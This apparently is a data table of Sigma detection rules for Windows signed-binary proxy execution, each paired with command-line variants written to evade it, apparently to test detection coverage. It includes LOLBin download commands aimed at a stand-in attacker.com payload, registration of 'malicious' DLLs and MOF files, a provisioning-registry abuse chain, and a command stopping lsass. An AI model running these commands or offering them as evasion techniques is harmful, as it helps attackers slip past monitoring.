Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1218	proc_creation_win_link_uncommon_parent_process	Uncommon Link.EXE Parent Process	6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6		copy cmd.exe link.exe && dumpbin.exe /EXPORTS kernel32.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_link_uncommon_parent_process	Uncommon Link.EXE Parent Process	6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6		"copy cmd.exe link.exe && ""dumpbin.exe"" /EXPORTS kernel32.dll"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_link_uncommon_parent_process	Uncommon Link.EXE Parent Process	6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6		copy cmd.exe link.exe && dumpbin.exe /EX kernel32.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_link_uncommon_parent_process	Uncommon Link.EXE Parent Process	6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6		copy cmd.exe link.exe && dumpbin.exe /EXPORTS: kernel32.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy calc .exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy `calc.exe`	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy .\calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy calc.exe # comment	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy calc.exe #	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_devtoolslauncher	Devtoolslauncher.exe Executes Specified Binary	cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6		devtoolslauncher.exe LaunchForDeploy calc.exe\	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_gpscript	Gpscript Execution	1e59c230-6670-45bf-83b0-98903780607e		gpscript.exe /LOGON /startup	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_gpscript	Gpscript Execution	1e59c230-6670-45bf-83b0-98903780607e		"gpscript.exe /logon"" "" /startup"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_gpscript	Gpscript Execution	1e59c230-6670-45bf-83b0-98903780607e		gpscript.exe -logon -startup	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_gpscript	Gpscript Execution	1e59c230-6670-45bf-83b0-98903780607e		gpscript.exe /logon	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_gpscript	Gpscript Execution	1e59c230-6670-45bf-83b0-98903780607e		gpscript.exe /logon /startup	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_mpiexec	MpiExec Lolbin	729ce0ea-5d8f-4769-9762-e35de441586d		mpiexec.exe -n 1 calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_mpiexec	MpiExec Lolbin	729ce0ea-5d8f-4769-9762-e35de441586d		mpiexec.exe -n1 calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_mpiexec	MpiExec Lolbin	729ce0ea-5d8f-4769-9762-e35de441586d		mpiexec.exe /n 1 calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_openwith	OpenWith.exe Executes Specified Binary	cec8e918-30f7-4e2d-9bfa-a59cc97ae60f		OpenWith.exe /c calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_openwith	OpenWith.exe Executes Specified Binary	cec8e918-30f7-4e2d-9bfa-a59cc97ae60f		OpenWith.exe -c calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_openwith	OpenWith.exe Executes Specified Binary	cec8e918-30f7-4e2d-9bfa-a59cc97ae60f		OpenWith.exe /c calc.exe >nul 2>&1	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_openwith	OpenWith.exe Executes Specified Binary	cec8e918-30f7-4e2d-9bfa-a59cc97ae60f		OpenWith.exe ^/c calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_openwith	OpenWith.exe Executes Specified Binary	cec8e918-30f7-4e2d-9bfa-a59cc97ae60f		OpenWith.exe /c calc.exe | findstr .	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_pcwrun_follina	Execute Pcwrun.EXE To Leverage Follina	6004abd0-afa4-4557-ba90-49d172e0a299		"pcwrun.exe msdt.exe /id PCWDiagnostic /skip true /param ""IT_BrowseForFile=..\..\..\Windows\System32\calc.exe"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_pcwrun_follina	Execute Pcwrun.EXE To Leverage Follina	6004abd0-afa4-4557-ba90-49d172e0a299		"pcwrun.exe msdt.exe /id PCWDiagnostic /skip true /param ""IT_BrowseForFile=..\\..\\..\\Windows\\System32\\calc.exe"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_pcwrun_follina	Execute Pcwrun.EXE To Leverage Follina	6004abd0-afa4-4557-ba90-49d172e0a299		"pcwrun.exe msdt.exe /id PCWDiagnostic /skip true /param ""IT_BrowseForFile=..%2F..%2F..%2FWINDOWS%2Fsystem32%2Fcalc.exe"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_rasautou_dll_execution	DLL Execution via Rasautou.exe	cd3d1298-eb3b-476c-ac67-12847de55813		rasautou.exe -d test.dll -p DllMain	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_rasautou_dll_execution	DLL Execution via Rasautou.exe	cd3d1298-eb3b-476c-ac67-12847de55813		rasautou.exe -d test.dll -pDllMain	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_rasautou_dll_execution	DLL Execution via Rasautou.exe	cd3d1298-eb3b-476c-ac67-12847de55813		rasautou.exe -p DllMain -d test.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_rasautou_dll_execution	DLL Execution via Rasautou.exe	cd3d1298-eb3b-476c-ac67-12847de55813		"rasautou.exe -d""test.dll"" -p""DllMain"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_register_app	REGISTER_APP.VBS Proxy Execution	1c8774a0-44d4-4db0-91f8-e792359c70bd		copy register_app.vbs legit_script.vbs && cscript //nologo legit_script.vbs -register YourMalicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_register_app	REGISTER_APP.VBS Proxy Execution	1c8774a0-44d4-4db0-91f8-e792359c70bd		copy register_app.vbs legit_script.vbs && cscript //nologo legit_script.vbs --register YourMalicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_register_app	REGISTER_APP.VBS Proxy Execution	1c8774a0-44d4-4db0-91f8-e792359c70bd		copy register_app.vbs legit_script.vbs && cscript /nologo legit_script.vbs -register YourMalicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_register_app	REGISTER_APP.VBS Proxy Execution	1c8774a0-44d4-4db0-91f8-e792359c70bd		"copy register_app.vbs legit_script.vbs && cscript //nologo legit_script.vbs -register ""YourMalicious.dll"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_scriptrunner	Use of Scriptrunner.exe	64760eef-87f7-4ed3-93fd-655668ea9420		ScriptRunner.exe -appvscript calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_scriptrunner	Use of Scriptrunner.exe	64760eef-87f7-4ed3-93fd-655668ea9420		ScriptRunner.exe /appvscript calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_scriptrunner	Use of Scriptrunner.exe	64760eef-87f7-4ed3-93fd-655668ea9420		"ScriptRunner.exe -appvscript"" calc.exe"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_execute_psh	SyncAppvPublishingServer Execute Arbitrary PowerShell Code	fbd7c32d-db2a-4418-b92c-566eb8911133		"SyncAppvPublishingServer.exe ""n;"" -ex Bypass -File script.ps1"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_execute_psh	SyncAppvPublishingServer Execute Arbitrary PowerShell Code	fbd7c32d-db2a-4418-b92c-566eb8911133		"SyncAppvPublishingServer.exe ""n;"" `nStop-Process -Name 'lsass'"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_execute_psh	SyncAppvPublishingServer Execute Arbitrary PowerShell Code	fbd7c32d-db2a-4418-b92c-566eb8911133		"SyncAppvPublishingServer.exe ""n;"" Start-Process calc.exe"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh	SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code	36475a7d-0f6d-4dce-9b01-6aeb473bbaf1		"cmd.exe /c C:\windows\system32\SyncAppvPublishingServer.vbs ""\n;Start-Process calc"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh	SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code	36475a7d-0f6d-4dce-9b01-6aeb473bbaf1		"copy SyncAppvPublishingServer.vbs Update.vbs && cscript Update.vbs ""\n;powershell.exe -NoP -Command Write-Host 'Bypassed'"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh	SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code	36475a7d-0f6d-4dce-9b01-6aeb473bbaf1		"wscript.exe ""SyncAppvPublishingServer.vbs"" ""\"" & powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command 'WhoAmI'"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolscript_register_app	Potential Register_App.Vbs LOLScript Abuse	28c8f68b-098d-45af-8d43-8089f3e35403		"copy C:\Windows\System32\vss\vsssampleprovider\register_app.vbs %TEMP%\legit.txt && cscript //e:vbscript %TEMP%\legit.txt -register ""malicious.dll"" ""MaliciousProvider"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolscript_register_app	Potential Register_App.Vbs LOLScript Abuse	28c8f68b-098d-45af-8d43-8089f3e35403		copy C:\Windows\System32\vss\vsssampleprovider\register_app.vbs %TEMP%\legit.txt && cscript //e:vbscript %TEMP%\legit.txt -register malicious.dll MaliciousProvider	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mofcomp_execution	Potential Suspicious Mofcomp Execution	1dd05363-104e-4b4a-b963-196a534b03a1		"""C:\windows\system32\wbem\mofcomp.exe"" C:\Windows\Temp\evasion.mof"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mofcomp_execution	Potential Suspicious Mofcomp Execution	1dd05363-104e-4b4a-b963-196a534b03a1		"mofcomp.exe -N:root\subscription ""C:\Users\Public\malicious.mof"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mofcomp_execution	Potential Suspicious Mofcomp Execution	1dd05363-104e-4b4a-b963-196a534b03a1		"Start-Process mofcomp.exe -ArgumentList ""C:\Windows\TEMP\evasion.mof"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mofcomp_execution	Potential Suspicious Mofcomp Execution	1dd05363-104e-4b4a-b963-196a534b03a1		copy mofcomp.exe not_mof.exe && not_mof.exe C:\Windows\Tasks\malicious.mof	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mpcmdrun_download_arbitrary_file	File Download Via Windows Defender MpCmpRun.EXE	46123129-1024-423e-9fae-43af4a0fa9a5		MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_msohtmed_download	Arbitrary File Download Via MSOHTMED.EXE	459f2f98-397b-4a4a-9f47-6a5ec2f1c69d		"msohtmed.exe ""http://attacker.com/payload.exe"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_msohtmed_download	Arbitrary File Download Via MSOHTMED.EXE	459f2f98-397b-4a4a-9f47-6a5ec2f1c69d		"msohtmed.exe ""h""tt""p""://attacker.com/payload.exe"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_msohtmed_download	Arbitrary File Download Via MSOHTMED.EXE	459f2f98-397b-4a4a-9f47-6a5ec2f1c69d		msohtmed.exe payload.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_powershell_remotefxvgpudisablement_abuse	RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses	a6fc3c46-23b8-4996-9ea2-573f4c4d88c5		"""powershell.exe"" & {Invoke-ATHRemoteFXvGPUDisableme -ModuleName foo -ModulePath $PWD}"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_powershell_remotefxvgpudisablement_abuse	RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses	a6fc3c46-23b8-4996-9ea2-573f4c4d88c5		"""powershell.exe"" & {Invoke-ATHRemoteFXvGPUDisablementCommand -Module foo -ModulePath $PWD}"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_powershell_remotefxvgpudisablement_abuse	RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses	a6fc3c46-23b8-4996-9ea2-573f4c4d88c5		"""powershell.exe"" & {Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $env:PWD}"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_powershell_remotefxvgpudisablement_abuse	RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses	a6fc3c46-23b8-4996-9ea2-573f4c4d88c5		"""powershell.exe"" & { Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $PWD }"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_powershell_remotefxvgpudisablement_abuse	RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses	a6fc3c46-23b8-4996-9ea2-573f4c4d88c5		"""powershell.exe"" & {Invoke-ATHRemoteFXvGPUDisablementCommand -ModulePath $PWD -ModuleName foo}"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_presentationhost_download	Arbitrary File Download Via PresentationHost.EXE	b124ddf4-778d-418e-907f-6dd3fc0d31cd		"PresentationHost.exe ""http://192.168.1.50/share/payload.xbap"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_presentationhost_download	Arbitrary File Download Via PresentationHost.EXE	b124ddf4-778d-418e-907f-6dd3fc0d31cd		PresentationHost.exe - http://192.168.1.50/share/payload.xbap	FALSE	FALSE	FALSE	
t1218	proc_creation_win_presentationhost_download	Arbitrary File Download Via PresentationHost.EXE	b124ddf4-778d-418e-907f-6dd3fc0d31cd		PresentationHost.exe https://192.168.1.50/share/payload.xbap	FALSE	FALSE	FALSE	
t1218	proc_creation_win_presentationhost_download	Arbitrary File Download Via PresentationHost.EXE	b124ddf4-778d-418e-907f-6dd3fc0d31cd		PresentationHost.exe ftp://192.168.1.50/share/payload.xbap	FALSE	FALSE	FALSE	
t1218	proc_creation_win_presentationhost_download	Arbitrary File Download Via PresentationHost.EXE	b124ddf4-778d-418e-907f-6dd3fc0d31cd		PresentationHost.exe \\192.168.1.50\share\payload.xbap	FALSE	FALSE	FALSE	
t1218	proc_creation_win_print_remote_file_copy	Abusing Print Executable	bafac3d6-7de9-4dd9-8874-4a1194b493ed		print /D:destination.exe source.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_print_remote_file_copy	Abusing Print Executable	bafac3d6-7de9-4dd9-8874-4a1194b493ed		print.exe /D:destination.exe source.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_print_remote_file_copy	Abusing Print Executable	bafac3d6-7de9-4dd9-8874-4a1194b493ed		print /D:C:\Temp\destination.txt source.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_protocolhandler_download	File Download Using ProtocolHandler.exe	104cdb48-a7a8-4ca7-a453-32942c6e5dcb		ProtocolHandler.exe http://attacker.com/payload.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_protocolhandler_download	File Download Using ProtocolHandler.exe	104cdb48-a7a8-4ca7-a453-32942c6e5dcb		"ProtocolHandler.exe ""http://attacker.com\payload.exe"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_protocolhandler_download	File Download Using ProtocolHandler.exe	104cdb48-a7a8-4ca7-a453-32942c6e5dcb		set URL=http://attacker.com/payload.exe && ProtocolHandler.exe %URL%	FALSE	FALSE	FALSE	
t1218	proc_creation_win_registry_provlaunch_provisioning_command	Potential Provisioning Registry Key Abuse For Binary Proxy Execution	2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25		"cmd.exe /c reg.exe add HKLM\""SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1"" /v altitude /t REG_DWORD /d 0 & reg add HKLM\""SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2"" /v Commandline /d calc.exe & c:\windows\system32\provlaunch.exe LOLBin"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_registry_provlaunch_provisioning_command	Potential Provisioning Registry Key Abuse For Binary Proxy Execution	2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25		reg.exe  add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_registry_provlaunch_provisioning_command	Potential Provisioning Registry Key Abuse For Binary Proxy Execution	2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25		reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0	FALSE	FALSE	FALSE	
t1218	proc_creation_win_registry_provlaunch_provisioning_command	Potential Provisioning Registry Key Abuse For Binary Proxy Execution	2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25		"provlaunch.exe ""SOFTWARE\Microsoft\Provisioning\Commands"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_registry_provlaunch_provisioning_command	Potential Provisioning Registry Key Abuse For Binary Proxy Execution	2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25		provlaunch.exe SOFTWARE/Microsoft/Provisioning/Commands	FALSE	FALSE	FALSE	
t1218	proc_creation_win_registry_provlaunch_provisioning_command	Potential Provisioning Registry Key Abuse For Binary Proxy Execution	2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25		provlaunch.exe SOFTWARE\Microsoft\Provisioning\\Commands	FALSE	FALSE	FALSE	
t1127	proc_creation_win_aspnet_compiler_susp_paths	Potentially Suspicious ASP.NET Compilation Via AspNetCompiler	9f50fe98-fe5c-4a2d-86c7-fad7f63ed622 # Susp Paths		"aspnet_compiler.exe -v / -p ""C:\Users\Public\TestSite"" ""C:\AppData\Local\Temp\Output"""	FALSE	FALSE	FALSE	
t1127	proc_creation_win_aspnet_compiler_susp_paths	Potentially Suspicious ASP.NET Compilation Via AspNetCompiler	9f50fe98-fe5c-4a2d-86c7-fad7f63ed622 # Susp Paths		aspnet_compiler.exe -v / -p C:\Users\Public\TestSite C:\AppData\Local\Temp\Output	FALSE	FALSE	FALSE	
t1127	proc_creation_win_aspnet_compiler_susp_paths	Potentially Suspicious ASP.NET Compilation Via AspNetCompiler	9f50fe98-fe5c-4a2d-86c7-fad7f63ed622 # Susp Paths		aspnet_compiler.exe -v / -p C:\Users\Public\TestSite C:\Windows\Temp\Output	FALSE	FALSE	FALSE	
t1127	proc_creation_win_aspnet_compiler_susp_paths	Potentially Suspicious ASP.NET Compilation Via AspNetCompiler	9f50fe98-fe5c-4a2d-86c7-fad7f63ed622 # Susp Paths		aspnet_compiler.exe -v / -p C:\Users\Public\TestSite C:\Users\MyUser\AppData\Local\Temp\Output	FALSE	FALSE	FALSE	
t1127	proc_creation_win_aspnet_compiler_susp_paths	Potentially Suspicious ASP.NET Compilation Via AspNetCompiler	9f50fe98-fe5c-4a2d-86c7-fad7f63ed622 # Susp Paths		aspnet_compiler.exe -v / -p C:\Users\Public\TestSite C:\Windows\System32\Tasks\Output	FALSE	FALSE	FALSE	
t1127	proc_creation_win_ilasm_il_code_compilation	C# IL Code Compilation Via Ilasm.EXE	850d55f9-6eeb-4492-ad69-a72338f65ba4		ilasm -dll -out=test.dll source.il	FALSE	FALSE	FALSE	
t1127	proc_creation_win_ilasm_il_code_compilation	C# IL Code Compilation Via Ilasm.EXE	850d55f9-6eeb-4492-ad69-a72338f65ba4		ilasm /dll source.il -out:test.dll	FALSE	FALSE	FALSE	
t1127	proc_creation_win_ilasm_il_code_compilation	C# IL Code Compilation Via Ilasm.EXE	850d55f9-6eeb-4492-ad69-a72338f65ba4		ilasm /dll source.il --out=test.dll	FALSE	FALSE	FALSE	
t1127	proc_creation_win_ilasm_il_code_compilation	C# IL Code Compilation Via Ilasm.EXE	850d55f9-6eeb-4492-ad69-a72338f65ba4		ilasm /dll source.il -out:./test.dll	FALSE	FALSE	FALSE	
t1127	proc_creation_win_kavremover_uncommon_execution	Kavremover Dropped Binary LOLBIN Usage	d047726b-c71c-4048-a99b-2e2f50dc107d		"copy kavremover_dropped_binary.exe not_kav.exe && not_kav.exe run run-cmd ""whoami"""	FALSE	FALSE	FALSE	
t1127	proc_creation_win_kavremover_uncommon_execution	Kavremover Dropped Binary LOLBIN Usage	d047726b-c71c-4048-a99b-2e2f50dc107d		"kavremover_binary.exe ""run""^ ""run-cmd"" ""net user"""	FALSE	FALSE	FALSE	
t1127	proc_creation_win_lolbin_vsiisexelauncher	Use of VSIISExeLauncher.exe	18749301-f1c5-4efc-a4c3-276ff1f5b6f8		VSIISExeLauncher.exe -p calc.exe -a arguments	FALSE	FALSE	FALSE	
t1127	proc_creation_win_node_abuse	Potential Arbitrary Code Execution Via Node.EXE	6640f31c-01ad-49b5-beb5-83498a5cd8bd		"node.exe -e ""require('child_process').exec('cmd /c echo test > C:\\Windows\\Temp\\test.txt');"""	FALSE	FALSE	FALSE	
t1127	proc_creation_win_node_abuse	Potential Arbitrary Code Execution Via Node.EXE	6640f31c-01ad-49b5-beb5-83498a5cd8bd		"node.exe --eval ""require('child_process').exec('powershell -Command ' + [char]34 + 'Write-Output ""bypass"" | Out-File C:\\Windows\\Temp\\bypass.txt' + [char]34);"""	FALSE	FALSE	FALSE	
t1127	proc_creation_win_node_abuse	Potential Arbitrary Code Execution Via Node.EXE	6640f31c-01ad-49b5-beb5-83498a5cd8bd		"node.exe -e ""require('net').Socket().connect(1337, '127.0.0.1', () => { console.log('Connected'); });"""	FALSE	FALSE	FALSE	
t1127	proc_creation_win_node_adobe_creative_cloud_abuse	Node Process Executions	df1f26d3-bea7-4700-9ea2-ad3e990cf90e		"""node.exe"" ""Adobe Creative Cloud Experience\js\malicious.js"""	FALSE	FALSE	FALSE	
t1127	proc_creation_win_node_adobe_creative_cloud_abuse	Node Process Executions	df1f26d3-bea7-4700-9ea2-ad3e990cf90e		"""node.exe"" -e ""console.log('Adobe Creative Cloud Experience\\js'); require('child_process').exec('malicious_script.js')"""	FALSE	FALSE	FALSE	
t1127	proc_creation_win_node_adobe_creative_cloud_abuse	Node Process Executions	df1f26d3-bea7-4700-9ea2-ad3e990cf90e		"cd ""C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\libs\"" && .\\node.exe -e ""require('os')"""	FALSE	FALSE	FALSE	
t1127	proc_creation_win_node_adobe_creative_cloud_abuse	Node Process Executions	df1f26d3-bea7-4700-9ea2-ad3e990cf90e		"copy ""node.exe"" not_node.exe && not_node.exe -e ""require('child_process').exec('calc.exe')"""	FALSE	FALSE	FALSE	
